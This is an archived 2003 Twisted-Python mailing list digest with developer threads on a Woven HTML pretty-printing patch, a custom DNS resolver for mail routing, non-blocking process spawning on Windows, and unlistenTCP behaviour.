References: <20030723002521.GC282@perpetual.moxn.net> <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com>
Message-ID: <20030723142334.GD282@perpetual.moxn.net>

On Wed, Jul 23, 2003 at 07:45:02AM -0500, Glyph Lefkowitz wrote:
> 
> On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:
> 
> >Attached is a diff for pretty-printing HTML in Woven.
> 
> Is this in the bugtracker someplace?

No, it's not -- I can add it if you'd like ;)

The only reason I'm posting it here is that I've been using it for weeks
already, and I wanted to see if people thought it was worth including.  I
know it's not an urgent bugfix, but I'm not really good at those anyways.

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From exarkun at twistedmatrix.com  Wed Jul 23 10:35:38 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Wed, 23 Jul 2003 10:35:38 -0400
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723111227.CAF8449DB1@euros.telenet-ops.be>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be>
Message-ID: <20030723143538.GA4915@intarweb.us>

On Wed, Jul 23, 2003 at 11:15:39AM +0000, rudy.schockaert at pandora.be wrote:
> Hi,
> 
> I need a DNS server that forwards all queries except for some predefined
> maildomains. For these domains a record pointing to a central mailrelay
> should be returned instead of the record that is present in Internet DNS.
> 
> Is this possible/difficult to do with Twisted?

  This should be pretty easy.  I think the way to go about it would be to
subclass t.names.client.Resolver and override lookupMailExchange(),
returning the central relay address instead for the affected domains, and
deferring (english meaning) to the parent implementation of the method for
everyone else.

> 
> How should I interpret the 'unstable' in the twisted.names documentation?

  It refers to the API stability -- meaning the modules haven't reached a
point where the developers are confident that no further changes which break
user code relyong on the module will be made.  It doesn't reflect on how
well the code actually works.

  Jp

-- 
"One World, one Web, one Program." - Microsoft(R) promotional ad
"Ein Volk, ein Reich, ein Fuhrer." - Adolf Hitler
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030723/dd32bf41/attachment.pgp 

From justinjohnson at fastmail.fm  Wed Jul 23 10:42:37 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 23 Jul 2003 08:42:37 -0600
Subject: [Twisted-Python] Pretty printing in Woven
In-Reply-To: <20030723142334.GD282@perpetual.moxn.net>
References: <20030723002521.GC282@perpetual.moxn.net> <7A810E72-BD0B-11D7-9652-000393C9700E@twistedmatrix.com> <20030723142334.GD282@perpetual.moxn.net>
Message-ID: <20030723144237.3E5A8390BC@www.fastmail.fm>

This is so newlines aren't stripped in the output, right?  If so I
personally think it is well worth patching.  The output is so hard to
read currently without the newlines.

-Justin

On Wed, 23 Jul 2003 14:23:34 +0000, "Alex Levy" <mesozoic at polynode.com>
said:
> On Wed, Jul 23, 2003 at 07:45:02AM -0500, Glyph Lefkowitz wrote:
> > 
> > On Tuesday, July 22, 2003, at 07:25 PM, Alex Levy wrote:
> > 
> > >Attached is a diff for pretty-printing HTML in Woven.
> > 
> > Is this in the bugtracker someplace?
> 
> No, it's not -- I can add it if you'd like ;)
> 
> The only reason I'm posting it here is that I've been using it for weeks
> already, and I wanted to see if people thought it was worth including.  I
> know it's not an urgent bugfix, but I'm not really good at those anyways.
> 
> -- 
> Alex Levy
> WWW: http://mesozoic.geecs.org
>  
> "Never let your sense of morals prevent you from doing what is right."
>  -- Salvor Hardin, Isaac Asimov's _Foundation_
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From justinjohnson at fastmail.fm  Wed Jul 23 12:16:51 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Wed, 23 Jul 2003 10:16:51 -0600
Subject: [Twisted-Python] Wrapping blocking code
Message-ID: <20030723161651.0355A38BBC@www.fastmail.fm>

I have some code in my xmlrpc service that executes commands using
process.py (http://starship.python.net/crew/tmick/).  The service appears
to block this code, thus only allowing one connection to get any work
done at a time, at least while the commands are being executed.  Should I
be wrapping this up in a Deferred somehow to avoid blocking?

Slowly but surely this is starting to make sense to me.  Twisted rocks!

Thanks.
-Justin



From Rudy.Schockaert at pandora.be  Wed Jul 23 12:19:57 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Wed, 23 Jul 2003 18:19:57 +0200
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723143538.GA4915@intarweb.us>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us>
Message-ID: <3F1EB5AD.4080100@pandora.be>

Jp Calderone wrote:

>On Wed, Jul 23, 2003 at 11:15:39AM +0000, rudy.schockaert at pandora.be wrote:
>  
>
>>Hi,
>>
>>I need a DNS server that forwards all queries except for some predefined
>>maildomains. For these domains a record pointing to a central mailrelay
>>should be returned instead of the record that is present in Internet DNS.
>>
>>Is this possible/difficult to do with Twisted?
>>    
>>
>
>  This should be pretty easy.  I think the way to go about it would be to
>subclass t.names.client.Resolver and override lookupMailExchange(),
>returning the central relay address instead for the affected domains, and
>deferring (english meaning) to the parent implementation of the method for
>everyone else.
>  
>
I'll give it a try this way. It doesn't seem too complicated indeed.

>  
>
>>How should I interpret the 'unstable' in the twisted.names documentation?
>>    
>>
>
>  It refers to the API stability -- meaning the modules haven't reached a
>point where the developers are confident that no further changes which break
>user code relyong on the module will be made.  It doesn't reflect on how
>well the code actually works.
>
>  Jp
>  
>
Browsing through the names package I came to the conclusion that I'd 
better not do this on Windows.

/Rudy

-------------- next part --------------
An HTML attachment was scrubbed...
URL: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030723/511643e0/attachment.htm 

From dizzyd at jabber.org  Wed Jul 23 16:42:15 2003
From: dizzyd at jabber.org (Dave Smith)
Date: Wed, 23 Jul 2003 14:42:15 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030723161651.0355A38BBC@www.fastmail.fm>
Message-ID: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Sounds to me like you want to use a deferToThread(...), to pass the 
calls off to the reactor's thread pool so they can run there without 
holding up the reactor's runloop.

See also: 
http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html

Hope that helps. :)

Diz

On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson 
wrote:

> I have some code in my xmlrpc service that executes commands using
> process.py (http://starship.python.net/crew/tmick/).  The service 
> appears
> to block this code, thus only allowing one connection to get any work
> done at a time, at least while the commands are being executed.  
> Should I
> be wrapping this up in a Deferred somehow to avoid blocking?
>
> Slowly but surely this is starting to make sense to me.  Twisted rocks!
>
> Thanks.
> -Justin
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.1 (Darwin)

iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
m830zVM1AnnL3fF76V1WHqY=
=39jf
-----END PGP SIGNATURE-----




From Rudy.Schockaert at pandora.be  Wed Jul 23 16:50:00 2003
From: Rudy.Schockaert at pandora.be (Rudy Schockaert)
Date: Wed, 23 Jul 2003 22:50:00 +0200
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <20030723143538.GA4915@intarweb.us>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us>
Message-ID: <3F1EF4F8.5080309@pandora.be>

Jp Calderone wrote:

>  This should be pretty easy.  I think the way to go about it would be to
>subclass t.names.client.Resolver and override lookupMailExchange(),
>returning the central relay address instead for the affected domains, and
>deferring (english meaning) to the parent implementation of the method for
>everyone else.
>  
>
Hi Jp,

I was trying to figure out how the twisted.names package works and I 
think I found a solution where I don't need to modify anything.

When I create a DNS server as follows:

mycache = {.........} # valid cache entries
ca, cl = [], []
ca.append(twisted.names.cache.CacheResolver(cache=mycache)) # preloaded 
cache
ca.append(twisted.names.cache.CacheResolver()) # regular empty cache
cl.append(twisted.names.client.createResolver())
f = twisted.names.server.DNSServerFactory(caches=ca, clients=cl)
p = twisted.protocols.dns.DNSDatagramProtocol(f)
app.listenUDP(53, p)
app.listenTCP(53, f)

I have two caches: one preloaded with my entries and a second one that 
is empty at the start.
When a request arrives for a record that is in my preloaded cache it is 
returned, but also added to the second cache (actually to the last cache 
passed to the DNSServerFactory)..
callLater in cacheResult will remove it later from the second cache but 
not from the first cache.
All other entries will follow the normal way, be it with one 
cache-lookup extra.

Is there somewhere an error in my reasoning? Are there other reasons why 
this is not a good approach?

Bet regards,

/Rudy




From exarkun at intarweb.us  Wed Jul 23 18:48:58 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Wed, 23 Jul 2003 18:48:58 -0400
Subject: [Twisted-Python] Custom DNS server
In-Reply-To: <3F1EF4F8.5080309@pandora.be>
References: <20030723111227.CAF8449DB1@euros.telenet-ops.be> <20030723143538.GA4915@intarweb.us> <3F1EF4F8.5080309@pandora.be>
Message-ID: <20030723224858.GA11636@intarweb.us>

On Wed, Jul 23, 2003 at 10:50:00PM +0200, Rudy Schockaert wrote:
> Jp Calderone wrote:
> 
> > This should be pretty easy.  I think the way to go about it would be to
> >subclass t.names.client.Resolver and override lookupMailExchange(),
> >returning the central relay address instead for the affected domains, and
> >deferring (english meaning) to the parent implementation of the method for
> >everyone else.
> > 
> >
> Hi Jp,
> 
> [snip]
> 
> I have two caches: one preloaded with my entries and a second one that 
> is empty at the start.
> When a request arrives for a record that is in my preloaded cache it is 
> returned, but also added to the second cache (actually to the last cache 
> passed to the DNSServerFactory)..
> callLater in cacheResult will remove it later from the second cache but 
> not from the first cache.
> All other entries will follow the normal way, be it with one 
> cache-lookup extra.
> 
> Is there somewhere an error in my reasoning? Are there other reasons why 
> this is not a good approach?
> 

  This looks like a pretty good solution, actually.  I wish I'd thought of
it :)

  The only possible problem I can imagine is that the extra latency created
by the extra cache miss before most lookups may confuse some clients -- but
on a modern piece of hardware (something I don't have myself, hence my
concern about such things :), I doubt this would actually be a problem.

  Jp

-- 
"One World, one Web, one Program." - Microsoft(R) promotional ad
"Ein Volk, ein Reich, ein Fuhrer." - Adolf Hitler
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030723/7072db6b/attachment.pgp 

From bob at redivi.com  Wed Jul 23 18:54:48 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 23 Jul 2003 18:54:48 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030723161651.0355A38BBC@www.fastmail.fm>
Message-ID: <A97A2DC2-BD60-11D7-9428-000A95686CD8@redivi.com>

On Wednesday, Jul 23, 2003, at 12:16 America/New_York, Justin Johnson 
wrote:

> I have some code in my xmlrpc service that executes commands using
> process.py (http://starship.python.net/crew/tmick/).  The service 
> appears
> to block this code, thus only allowing one connection to get any work
> done at a time, at least while the commands are being executed.  
> Should I
> be wrapping this up in a Deferred somehow to avoid blocking?
>
> Slowly but surely this is starting to make sense to me.  Twisted rocks!

Ideally you would convert your process.py dependent code to something 
that uses reactor.spawnProcess() with a ProcessProtocol that does what 
you need with the process.  You may still want to use process.py to do 
the argument conversion, because I don't believe this functionality is 
duplicated in Twisted.

  See: http://www.twistedmatrix.com/documents/howto/process

-bob




From golux at comcast.net  Wed Jul 23 12:35:08 2003
From: golux at comcast.net (Stephen C. Waterbury)
Date: Wed, 23 Jul 2003 12:35:08 -0400
Subject: [Twisted-Python] Patch for thinko/typo in components howto
Message-ID: <3F1EB93C.2030808@comcast.net>

The CVS version is slightly different from what's on the web, but
both have this error.  (The one that's on the web additionally has the error
that "the method definitions inside the [Interface] class block do not 
have any
self parameters", but this has of course been fixed in CVS ...)

Steve.

-------------- next part --------------
An embedded and charset-unspecified text was scrubbed...
Name: components.html.diff
Url: http://twistedmatrix.com/pipermail/twisted-python/attachments/20030723/455eaf5d/attachment.txt 

From mporter at despammed.com  Thu Jul 24 13:15:28 2003
From: mporter at despammed.com (Michael Porter)
Date: Thu, 24 Jul 2003 18:15:28 +0100
Subject: [Twisted-Python] unlistenTCP not working?
Message-ID: <00de01c35207$2de818e0$0201a8c0@dan>

Hi,

I'm having a problem with unlistenTCP - it doesn't seem to work if
application.listenTCP was called after the reactor is started. Am I missing
something here or is this a bug? See test code below for demonstration...

def listen(application, port):
    from twisted.web import server, resource
    print "called listen %d" % port
    application.listenTCP(port, server.Site(resource.Resource()))

def unlisten(application, port):
    print "called unlisten %d" % port
    application.unlistenTCP(port)

def test(listenFirst):
    from twisted.python import log
    import sys
    log.startLogging(sys.stdout, 0)
    from twisted.internet import app, reactor
    application = app.Application("test")
    if listenFirst:
        listen(application, 8080)
    else:
        reactor.callLater(0, listen, application, 8080)
    reactor.callLater(5, unlisten, application, 8080)
    application.run(save=0)

If you call test(listenFirst = 1) then all works as expected (log shows it
starts listening immediately and stops after 5 secs). But if you start
listening by scheduling a call after application.run (call test(listenFirst
= 0)) the listenTCP works but when unlisten is called 5 secs later it
doesn't seem to stop listening and nothing appears in the log.

(I'm running on Windows with twisted 1.0.6)

Any ideas? Thanks,

Mike.





From warner at lothar.com  Thu Jul 24 13:40:42 2003
From: warner at lothar.com (Brian Warner)
Date: Thu, 24 Jul 2003 10:40:42 -0700 (PDT)
Subject: [Twisted-Python] Patch for thinko/typo in components howto
References: <3F1EB93C.2030808@comcast.net>
Message-ID: <20030724.104042.126595148.warner@lothar.com>

>  class IAmericanSocket(components.Interface):
> -    def voltage():
> +    def voltage(self):

Committed to CVS. Thanks!

 -Brian



From itamar at itamarst.org  Thu Jul 24 13:42:25 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 24 Jul 2003 13:42:25 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <00de01c35207$2de818e0$0201a8c0@dan>
References: <00de01c35207$2de818e0$0201a8c0@dan>
Message-ID: <20030724134225.617d4fca.itamar@itamarst.org>

On Thu, 24 Jul 2003 18:15:28 +0100
"Michael Porter" <mporter at despammed.com> wrote:

> I'm having a problem with unlistenTCP - it doesn't seem to work if
> application.listenTCP was called after the reactor is started. Am I
> missing something here or is this a bug? See test code below for
> demonstration...

In general, if you're doing unlisten, it's probably best to just use
"port = reactor.listenTCP", and "port.stopListening()" when you're done.

The idea is, application knows about stuff that is always going to be
there. If it's temporary or changes on every run, just use the reactor
directly.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From exarkun at intarweb.us  Thu Jul 24 13:55:57 2003
From: exarkun at intarweb.us (Jp Calderone)
Date: Thu, 24 Jul 2003 13:55:57 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <00de01c35207$2de818e0$0201a8c0@dan>
References: <00de01c35207$2de818e0$0201a8c0@dan>
Message-ID: <20030724175557.GA17814@intarweb.us>

On Thu, Jul 24, 2003 at 06:15:28PM +0100, Michael Porter wrote:
> Hi,
> 
> I'm having a problem with unlistenTCP - it doesn't seem to work if
> application.listenTCP was called after the reactor is started. Am I missing
> something here or is this a bug? See test code below for demonstration...
> 
> def listen(application, port):
>     from twisted.web import server, resource
>     print "called listen %d" % port
>     application.listenTCP(port, server.Site(resource.Resource()))
> 
> def unlisten(application, port):
>     print "called unlisten %d" % port
>     application.unlistenTCP(port)
> 
> def test(listenFirst):
>     from twisted.python import log
>     import sys
>     log.startLogging(sys.stdout, 0)
>     from twisted.internet import app, reactor
>     application = app.Application("test")
>     if listenFirst:
>         listen(application, 8080)
>     else:
>         reactor.callLater(0, listen, application, 8080)
>     reactor.callLater(5, unlisten, application, 8080)
>     application.run(save=0)
> 
> If you call test(listenFirst = 1) then all works as expected (log shows it
> starts listening immediately and stops after 5 secs). But if you start
> listening by scheduling a call after application.run (call test(listenFirst
> = 0)) the listenTCP works but when unlisten is called 5 secs later it
> doesn't seem to stop listening and nothing appears in the log.
> 
> (I'm running on Windows with twisted 1.0.6)
> 
> Any ideas? Thanks,
> 

  I believe this is somewhat intentional.  When the reactor is running,
listenXYZ() return Port objects which have a `stopListening' method.  It is
expected that listeners added while the application is running will have
this port object stashed away by the user code and, when the time comes,
have their `stopListening' method called.

  In practice, this can be somewhat difficult to manage, and is a good
reason to use ApplicationServices to manage listeners and connectors.

  I'm not sure if this could be "fixed", since it has behaved this way for a
long time, and some applications may depend on the behavior.

  Jp

-- 
"Minerals are inexhaustible and will never be depleted. A stream of
investment creates additions to proved reserves, a very large in-ground
inventory, constantly renewed as it is extracted... How much was in the
ground at the start and how much will be left at the end are unknown and
irrelevant."  -- Morry Adelman, World Renowned Economist
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030724/bf8f9788/attachment.pgp 

From itamar at itamarst.org  Thu Jul 24 13:56:08 2003
From: itamar at itamarst.org (Itamar Shtull-Trauring)
Date: Thu, 24 Jul 2003 13:56:08 -0400
Subject: [Twisted-Python] unlistenTCP not working?
In-Reply-To: <20030724175557.GA17814@intarweb.us>
References: <00de01c35207$2de818e0$0201a8c0@dan>
	<20030724175557.GA17814@intarweb.us>
Message-ID: <20030724135608.7d962b43.itamar@itamarst.org>

On Thu, 24 Jul 2003 13:55:57 -0400
Jp Calderone <exarkun at intarweb.us> wrote:

>   I'm not sure if this could be "fixed", since it has behaved this way
>   for a
> long time, and some applications may depend on the behavior.

Long term fix is to deprecate app.listenTCP, of course.

-- 
Itamar Shtull-Trauring    http://itamarst.org/
http://www.zoteca.com -- Python & Twisted consulting



From mporter at despammed.com  Fri Jul 25 04:45:33 2003
From: mporter at despammed.com (Michael Porter)
Date: Fri, 25 Jul 2003 09:45:33 +0100
Subject: [Twisted-Python] unlistenTCP not working?
References: <00de01c35207$2de818e0$0201a8c0@dan> <20030724134225.617d4fca.itamar@itamarst.org>
Message-ID: <007301c35289$1cc58610$0201a8c0@dan>

From: "Itamar Shtull-Trauring" <itamar at itamarst.org>

> On Thu, 24 Jul 2003 18:15:28 +0100
> "Michael Porter" <mporter at despammed.com> wrote:
> 
> > I'm having a problem with unlistenTCP - it doesn't seem to work if
> > application.listenTCP was called after the reactor is started. Am I
> > missing something here or is this a bug? See test code below for
> > demonstration...
> 
> In general, if you're doing unlisten, it's probably best to just use
> "port = reactor.listenTCP", and "port.stopListening()" when you're done.
> 
> The idea is, application knows about stuff that is always going to be
> there. If it's temporary or changes on every run, just use the reactor
> directly.
> 

Ok, I didn't realise listenTCP returned Port objects.

Thanks, Mike.




From justinjohnson at fastmail.fm  Fri Jul 25 10:17:52 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 08:17:52 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>
References: <251CC9F6-BD4E-11D7-913F-00039386381C@jabber.org>
Message-ID: <20030725141752.398A938393@www.fastmail.fm>

Since I'm running on win2k (ugh!) I followed the instructions to use
win32eventreactor instead of the default posix reactor.  I did read
through the docstrings, and it does mention that process calling can be
problematic.  I ran the code below and got the following error.  Is it
possible to get this working on windows?  It is marked as semi-stable. 
Man I hate windows!  Unfortunately the servers I support are all windows
boxes.


C:\Python22\Lib\site-packages\twisted\internet\win32eventreactor.py:198:
Depreca
tionWarning: Foolish capitalist!  Your opulent toilet will be your
undoing!!
  log.logOwner.own(fd)
C:\Python22\Lib\site-packages\twisted\internet\win32eventreactor.py:213:
Depreca
tionWarning: The proletariat is victorious.
  log.logOwner.disown(fd)


[snip]
from twisted.internet import protocol
from twisted.internet import win32eventreactor
win32eventreactor.install()
from twisted.internet import reactor

class MyProcessProtocol(protocol.ProcessProtocol):
	finished = 0

	def connectionMade(self):
		self.data = ''
		self.err = ''
		self.transport.write("connectionMade")

	def outReceived(self, data):
		self.data = self.data + data

	def outConnectionLost(self):
		self.transport.write("outConnectionLost")

	def errReceived(self, data):
		self.err = self.err + data
		self.transport.write("errReceived")

	def errConnectionLost(self):
		self.transport.write("errConnectionLost")

	def inConnectionLost(self):
		self.transport.write("inConnectionLost")

	def processEnded(self, reason):
		self.finished = 1
		self.reason = reason
		self.transport.write("processEnded")


exe = r"c:\program files\rational\clearcase\bin\cleartool.exe"
p = MyProcessProtocol()
reactor.spawnProcess(p, exe, [exe, "lsview", "-s"], env=None)
while not p.finished:
	reactor.iterate()
[/snip]


On Wed, 23 Jul 2003 14:42:15 -0600, "Dave Smith" <dizzyd at jabber.org>
said:
> -----BEGIN PGP SIGNED MESSAGE-----
> Hash: SHA1
> 
> Sounds to me like you want to use a deferToThread(...), to pass the 
> calls off to the reactor's thread pool so they can run there without 
> holding up the reactor's runloop.
> 
> See also: 
> http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html
> 
> Hope that helps. :)
> 
> Diz
> 
> On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson 
> wrote:
> 
> > I have some code in my xmlrpc service that executes commands using
> > process.py (http://starship.python.net/crew/tmick/).  The service 
> > appears
> > to block this code, thus only allowing one connection to get any work
> > done at a time, at least while the commands are being executed.  
> > Should I
> > be wrapping this up in a Deferred somehow to avoid blocking?
> >
> > Slowly but surely this is starting to make sense to me.  Twisted rocks!
> >
> > Thanks.
> > -Justin
> >
> > _______________________________________________
> > Twisted-Python mailing list
> > Twisted-Python at twistedmatrix.com
> > http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> -----BEGIN PGP SIGNATURE-----
> Version: GnuPG v1.2.1 (Darwin)
> 
> iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
> m830zVM1AnnL3fF76V1WHqY=
> =39jf
> -----END PGP SIGNATURE-----
> 
> 
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
> 



From bob at redivi.com  Fri Jul 25 10:39:48 2003
From: bob at redivi.com (Bob Ippolito)
Date: Fri, 25 Jul 2003 10:39:48 -0400
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <20030725141752.398A938393@www.fastmail.fm>
Message-ID: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>

That's kind of amusing.  I'm not particularly familiar with the log or  
win32eventreactor modules... but as far as I can tell, those messages  
mean "dude, don't use log.logOwner anymore".  It's not your fault, it's  
the twisted team's fault for not keeping win32eventreactor up to date  
with the latest conventions.  They're just DeprecationWarnings, so  
they're harmless to everything other than your eyes and our pride :)

Also, instead of using that reactor.iterate() hack.. it's better to be  
in the habit of writing something event driven.. for example, you could  
override the __init__ for protocol.ProcessProtocol (well, it's not  
really overriding anything, since it doesn't have one) from your  
subclass, stick a Deferred in the instance, and do a callback in  
processEnded... like this:

class MyProcessProtocol(protocol.ProcessProtocol):
	def __init__(self):
		self.deferred = defer.Deferred()

	...cut and paste your code...

	def processEnded(self, reason):
		...cut and paste some more code...
		self.deferred.callback(reason)

...cut and paste again, but throw out your for loop...
p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
reactor.run()

The reactor.callLater(0.0, ....) is just to prevent the reactor from  
shutting down before it starts, because a deferred could theoretically  
fire immediately.  I'm pretty sure it couldn't in this case, but I  
usually put it there anyway when I'm stopping a reactor because in some  
situations it can (usually a bug in my code that causes an errback  
immediately, or something).

-bob

On Friday, Jul 25, 2003, at 10:17 America/New_York, Justin Johnson  
wrote:

> Since I'm running on win2k (ugh!) I followed the instructions to use
> win32eventreactor instead of the default posix reactor.  I did read
> through the docstrings, and it does mention that process calling can be
> problematic.  I ran the code below and got the following error.  Is it
> possible to get this working on windows?  It is marked as semi-stable.
> Man I hate windows!  Unfortunately the servers I support are all  
> windows
> boxes.
>
>
> C:\Python22\Lib\site- 
> packages\twisted\internet\win32eventreactor.py:198:
> Depreca
> tionWarning: Foolish capitalist!  Your opulent toilet will be your
> undoing!!
>   log.logOwner.own(fd)
> C:\Python22\Lib\site- 
> packages\twisted\internet\win32eventreactor.py:213:
> Depreca
> tionWarning: The proletariat is victorious.
>   log.logOwner.disown(fd)
>
>
> [snip]
> from twisted.internet import protocol
> from twisted.internet import win32eventreactor
> win32eventreactor.install()
> from twisted.internet import reactor
>
> class MyProcessProtocol(protocol.ProcessProtocol):
> 	finished = 0
>
> 	def connectionMade(self):
> 		self.data = ''
> 		self.err = ''
> 		self.transport.write("connectionMade")
>
> 	def outReceived(self, data):
> 		self.data = self.data + data
>
> 	def outConnectionLost(self):
> 		self.transport.write("outConnectionLost")
>
> 	def errReceived(self, data):
> 		self.err = self.err + data
> 		self.transport.write("errReceived")
>
> 	def errConnectionLost(self):
> 		self.transport.write("errConnectionLost")
>
> 	def inConnectionLost(self):
> 		self.transport.write("inConnectionLost")
>
> 	def processEnded(self, reason):
> 		self.finished = 1
> 		self.reason = reason
> 		self.transport.write("processEnded")
>
>
> exe = r"c:\program files\rational\clearcase\bin\cleartool.exe"
> p = MyProcessProtocol()
> reactor.spawnProcess(p, exe, [exe, "lsview", "-s"], env=None)
> while not p.finished:
> 	reactor.iterate()
> [/snip]
>
>
> On Wed, 23 Jul 2003 14:42:15 -0600, "Dave Smith" <dizzyd at jabber.org>
> said:
>> -----BEGIN PGP SIGNED MESSAGE-----
>> Hash: SHA1
>>
>> Sounds to me like you want to use a deferToThread(...), to pass the
>> calls off to the reactor's thread pool so they can run there without
>> holding up the reactor's runloop.
>>
>> See also:
>> http://www.itamarst.org/writings/OSCON03/twisted_internet-95.html
>>
>> Hope that helps. :)
>>
>> Diz
>>
>> On Wednesday, Jul 23, 2003, at 10:16 America/Denver, Justin Johnson
>> wrote:
>>
>>> I have some code in my xmlrpc service that executes commands using
>>> process.py (http://starship.python.net/crew/tmick/).  The service
>>> appears
>>> to block this code, thus only allowing one connection to get any work
>>> done at a time, at least while the commands are being executed.
>>> Should I
>>> be wrapping this up in a Deferred somehow to avoid blocking?
>>>
>>> Slowly but surely this is starting to make sense to me.  Twisted  
>>> rocks!
>>>
>>> Thanks.
>>> -Justin
>>>
>>> _______________________________________________
>>> Twisted-Python mailing list
>>> Twisted-Python at twistedmatrix.com
>>> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>> -----BEGIN PGP SIGNATURE-----
>> Version: GnuPG v1.2.1 (Darwin)
>>
>> iD8DBQE/HvMnYNE3chVHHsMRAplLAJ0bbnqUGSDkDz3AZPvCNTvOn1T8TgCg8nCd
>> m830zVM1AnnL3fF76V1WHqY=
>> =39jf
>> -----END PGP SIGNATURE-----
>>
>>
>> _______________________________________________
>> Twisted-Python mailing list
>> Twisted-Python at twistedmatrix.com
>> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>>
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python




From justinjohnson at fastmail.fm  Fri Jul 25 11:42:29 2003
From: justinjohnson at fastmail.fm (Justin Johnson)
Date: Fri, 25 Jul 2003 09:42:29 -0600
Subject: [Twisted-Python] Wrapping blocking code
In-Reply-To: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>
References: <D7A856E6-BEAD-11D7-B892-000A95686CD8@redivi.com>
Message-ID: <20030725154229.4531337E32@www.fastmail.fm>

Thanks for the reply.  Questions below.

On Fri, 25 Jul 2003 10:39:48 -0400, "Bob Ippolito" <bob at redivi.com> said:
> That's kind of amusing.  I'm not particularly familiar with the log or  
> win32eventreactor modules... but as far as I can tell, those messages  
> mean "dude, don't use log.logOwner anymore".  It's not your fault, it's  
> the twisted team's fault for not keeping win32eventreactor up to date  
> with the latest conventions.  They're just DeprecationWarnings, so  
> they're harmless to everything other than your eyes and our pride :)
> 
> Also, instead of using that reactor.iterate() hack.. it's better to be  
> in the habit of writing something event driven.. for example, you could  
> override the __init__ for protocol.ProcessProtocol (well, it's not  
> really overriding anything, since it doesn't have one) from your  
> subclass, stick a Deferred in the instance, and do a callback in  
> processEnded... like this:
> 
> class MyProcessProtocol(protocol.ProcessProtocol):
> 	def __init__(self):
> 		self.deferred = defer.Deferred()
> 
> 	...cut and paste your code...
> 
> 	def processEnded(self, reason):
> 		...cut and paste some more code...
> 		self.deferred.callback(reason)

reason is an Exception from twisted.internet.error.  It is an instance of
ProcessDone if it completes successfully.  How can this be called?  When
I was using the other process.py module, it allowed me to get stdout,
stderr, and the status.  That is really all I want to do.  So it seems
like stdout and stderr are easy to get with the xxxReceived methods, and
then the status would have to be determined from the type of exception
processEnded gets as the "reason" argument, right?

I used to have code like...

cmd = "cmd arg1 arg2"
p = process.ProcessOpen(cmd)
status = p.wait()
stdout = p.stdout.read()
stderr = p.stderr.read()
if status != 0:
    raise errors.CmdError(cmd, status, stdout, stderr) # an Exception I
    defined

...and this was in a module that didn't know about twisted, and I'd
prefer to keep it that way if possible.  What is the best way to wrap a
class with methods that contain code like this up with twisted?  Attached
is the latest version of the ProcessProtocol code which is working
(except for not knowing exactly how to get the real status).  I'm just
not sure what to do with it.

> 
> ...cut and paste again, but throw out your for loop...
> p.addBoth(lambda ignore: reactor.callLater(0.0, reactor.stop))
> reactor.run()

